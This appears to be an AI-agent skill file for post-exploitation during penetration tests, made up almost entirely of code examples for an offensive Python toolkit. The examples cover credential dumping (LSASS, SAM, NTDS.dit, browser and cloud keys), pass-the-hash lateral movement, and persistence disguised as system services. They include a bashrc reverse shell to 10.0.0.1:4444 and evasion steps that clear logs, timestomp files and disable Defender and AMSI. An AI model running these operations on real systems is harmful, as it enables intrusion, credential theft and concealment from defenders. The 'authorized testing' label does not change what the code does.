---
name: post-exploitation
description: |
  Post-exploitation activities for authorized penetration testing. Privilege
  escalation, lateral movement, persistence, and data exfiltration techniques.
  Use after initial access during security assessments.
license: Apache-2.0
compatibility: |
  - Python 3.9+
  - Optional: impacket, paramiko
metadata:
  author: SherifEldeeb
  version: "1.0.0"
  category: pentesting
---

# Post-Exploitation Skill

Post-exploitation capabilities for authorized penetration testing engagements.

## Capabilities

- **Privilege Escalation**: Linux and Windows privilege escalation
- **Lateral Movement**: Move between systems
- **Persistence**: Establish persistence mechanisms
- **Credential Harvesting**: Extract credentials from systems
- **Data Discovery**: Find sensitive data
- **Exfiltration**: Securely exfiltrate data
- **Defense Evasion**: Avoid detection
- **Situational Awareness**: Gather system intelligence

## Quick Start

```python
from postexploit_utils import PrivilegeEscalation, LateralMovement, CredentialHarvester

# Check privilege escalation paths
privesc = PrivilegeEscalation()
vulns = privesc.enumerate_linux()
print(vulns)

# Lateral movement
lateral = LateralMovement()
lateral.psexec('192.168.1.101', 'admin', 'password')

# Credential harvesting
creds = CredentialHarvester()
hashes = creds.dump_hashes()
```

## Usage

### Privilege Escalation - Linux

Enumerate and exploit Linux privilege escalation vectors.

**Example**:
```python
from postexploit_utils import PrivilegeEscalation

privesc = PrivilegeEscalation()

# Full enumeration
results = privesc.enumerate_linux()

# Check SUID binaries
suid = privesc.check_suid_binaries()
for binary in suid['exploitable']:
    print(f"Exploitable: {binary['path']} - {binary['technique']}")

# Check sudo permissions
sudo = privesc.check_sudo_permissions()
print(f"NOPASSWD commands: {sudo['nopasswd']}")
print(f"GTFOBins matches: {sudo['gtfobins']}")

# Check cron jobs
cron = privesc.check_cron_jobs()
for job in cron['writable']:
    print(f"Writable cron: {job}")

# Check capabilities
caps = privesc.check_capabilities()

# Check kernel exploits
kernel = privesc.check_kernel_exploits()
for exploit in kernel:
    print(f"{exploit['cve']}: {exploit['name']}")

# Check writable paths
paths = privesc.check_writable_paths()

# Check docker/lxd membership
container = privesc.check_container_escape()

# Generate report
print(privesc.generate_report())
```

### Privilege Escalation - Windows

Enumerate Windows privilege escalation vectors.

**Example**:
```python
from postexploit_utils import PrivilegeEscalation

privesc = PrivilegeEscalation()

# Full Windows enumeration
results = privesc.enumerate_windows()

# Check unquoted service paths
services = privesc.check_unquoted_paths()
for svc in services['vulnerable']:
    print(f"Unquoted: {svc['name']} - {svc['path']}")

# Check weak service permissions
weak_svc = privesc.check_service_permissions()

# Check always install elevated
aie = privesc.check_always_install_elevated()

# Check DLL hijacking opportunities
dll = privesc.check_dll_hijacking()

# Check scheduled tasks
tasks = privesc.check_scheduled_tasks()

# Check registry autorun
autorun = privesc.check_autorun()

# Check stored credentials
stored = privesc.check_stored_credentials()

# Check token privileges
tokens = privesc.check_token_privileges()
print(f"SeImpersonate: {tokens['SeImpersonatePrivilege']}")
print(f"SeDebug: {tokens['SeDebugPrivilege']}")

# Check for common exploits
exploits = privesc.check_windows_exploits()
```

### Lateral Movement

Move between systems in the network.

**Example**:
```python
from postexploit_utils import LateralMovement

lateral = LateralMovement()

# PsExec-style movement
lateral.psexec(
    target='192.168.1.101',
    username='admin',
    password='password',
    command='whoami'
)

# WMI execution
lateral.wmi_exec(
    target='192.168.1.101',
    username='admin',
    password='password',
    command='ipconfig'
)

# SMB execution
lateral.smb_exec(
    target='192.168.1.101',
    username='admin',
    password_hash='aad3b435b51404eeaad3b435b51404ee:...'
)

# WinRM execution
lateral.winrm_exec(
    target='192.168.1.101',
    username='admin',
    password='password'
)

# SSH movement
lateral.ssh_exec(
    target='192.168.1.101',
    username='root',
    key_file='/path/to/key'
)

# RDP session
lateral.rdp_connect(
    target='192.168.1.101',
    username='admin',
    password='password'
)

# Pass the hash
lateral.pass_the_hash(
    target='192.168.1.101',
    username='admin',
    ntlm_hash='aad3b435b51404eeaad3b435b51404ee:...'
)

# Pass the ticket
lateral.pass_the_ticket(
    target='192.168.1.101',
    ticket_path='/path/to/ticket.kirbi'
)
```

### Credential Harvesting

Extract credentials from systems.

**Example**:
```python
from postexploit_utils import CredentialHarvester

creds = CredentialHarvester()

# Dump local hashes (Windows)
hashes = creds.dump_hashes()
print(f"SAM hashes: {hashes['sam']}")
print(f"LSA secrets: {hashes['lsa']}")

# Dump LSASS memory
lsass = creds.dump_lsass()
print(f"Cleartext passwords: {lsass['cleartext']}")
print(f"NTLM hashes: {lsass['ntlm']}")
print(f"Kerberos tickets: {lsass['tickets']}")

# Dump domain credentials
domain = creds.dump_domain_creds()
print(f"NTDS.dit hashes: {domain['hashes']}")

# Search for credentials in files
files = creds.search_credential_files()
for f in files:
    print(f"Found: {f['path']} - {f['type']}")

# Extract browser credentials
browser = creds.dump_browser_credentials()

# Extract SSH keys
ssh = creds.dump_ssh_keys()

# WiFi passwords
wifi = creds.dump_wifi_passwords()

# Vault credentials
vault = creds.dump_vault_credentials()

# Keychain (macOS)
keychain = creds.dump_keychain()
```

### Persistence

Establish persistence mechanisms.

**Example**:
```python
from postexploit_utils import PersistenceManager

persist = PersistenceManager()

# Windows persistence
persist.add_registry_run(
    name='Updater',
    command='C:\\Windows\\Temp\\payload.exe'
)

persist.add_scheduled_task(
    name='SystemCheck',
    command='C:\\Windows\\Temp\\payload.exe',
    trigger='daily'
)

persist.add_service(
    name='WindowsUpdate',
    binary_path='C:\\Windows\\Temp\\svc.exe'
)

persist.add_wmi_subscription(
    name='ProcessMonitor',
    command='C:\\Windows\\Temp\\payload.exe'
)

# Linux persistence
persist.add_cron_job(
    schedule='*/5 * * * *',
    command='/tmp/.hidden/backdoor'
)

persist.add_ssh_key(
    public_key='ssh-rsa AAAA...'
)

persist.add_bashrc_backdoor(
    command='bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
)

persist.add_systemd_service(
    name='system-monitor',
    command='/opt/.monitor/backdoor'
)

# List persistence mechanisms
mechanisms = persist.list_persistence()
for m in mechanisms:
    print(f"{m['type']}: {m['location']}")

# Remove persistence
persist.remove_persistence('registry_run', 'Updater')
```

### Data Discovery

Find sensitive data on systems.

**Example**:
```python
from postexploit_utils import DataDiscovery

discovery = DataDiscovery()

# Search for sensitive files
sensitive = discovery.find_sensitive_files(
    paths=['/home', 'C:\\Users'],
    patterns=['password', 'credential', 'secret', 'key']
)

for file in sensitive:
    print(f"Found: {file['path']} - Matches: {file['matches']}")

# Search for specific file types
configs = discovery.find_config_files()
databases = discovery.find_databases()
documents = discovery.find_documents(types=['pdf', 'docx', 'xlsx'])

# Search file contents
content_matches = discovery.search_file_contents(
    pattern=r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
    file_types=['txt', 'log', 'conf']
)

# Find network shares
shares = discovery.enumerate_shares()

# Find cloud credentials
cloud = discovery.find_cloud_credentials()
print(f"AWS: {cloud['aws']}")
print(f"Azure: {cloud['azure']}")
print(f"GCP: {cloud['gcp']}")
```

### Defense Evasion

Avoid detection during post-exploitation.

**Example**:
```python
from postexploit_utils import DefenseEvasion

evasion = DefenseEvasion()

# Clear logs
evasion.clear_windows_logs()
evasion.clear_linux_logs()

# Timestomp files
evasion.timestomp('/tmp/payload', '2020-01-01 00:00:00')

# Hide files
evasion.hide_file('C:\\Windows\\Temp\\payload.exe')

# Disable security tools
evasion.disable_defender()
evasion.disable_amsi()

# In-memory execution
evasion.execute_in_memory(payload_bytes)

# Process injection
evasion.inject_into_process(target_pid, shellcode)

# Clean artifacts
evasion.cleanup_artifacts([
    '/tmp/payload',
    'C:\\Windows\\Temp\\tools'
])
```

## Configuration

### Environment Variables

| Variable | Description | Required | Default |
|----------|-------------|----------|---------|
| `POSTEX_OUTPUT_DIR` | Output directory | No | `./output` |
| `POSTEX_LOG_LEVEL` | Logging level | No | `INFO` |

## Examples

### Example 1: Full Post-Exploitation Chain

**Scenario**: Complete post-exploitation on Windows domain

**Process**:
```
1. Enumerate local privesc → Found unquoted service path
2. Escalate to SYSTEM → Success
3. Dump credentials → Found domain admin hash
4. Lateral movement → PSExec to DC
5. Dump NTDS.dit → All domain hashes
6. Establish persistence → WMI subscription
7. Clean up → Clear logs, timestomp files
```

## Limitations

- **Requires Access**: Need initial shell/access
- **AV/EDR**: May be detected by security tools
- **Logging**: Activities may be logged

## Related Skills

- [exploitation](../exploitation/): Initial access
- [active-directory-testing](../active-directory-testing/): Domain attacks
- [password-attacks](../password-attacks/): Crack harvested hashes
- [pentest-reporting](../pentest-reporting/): Document activities

## References

- [MITRE ATT&CK](https://attack.mitre.org/)
- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS](https://lolbas-project.github.io/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
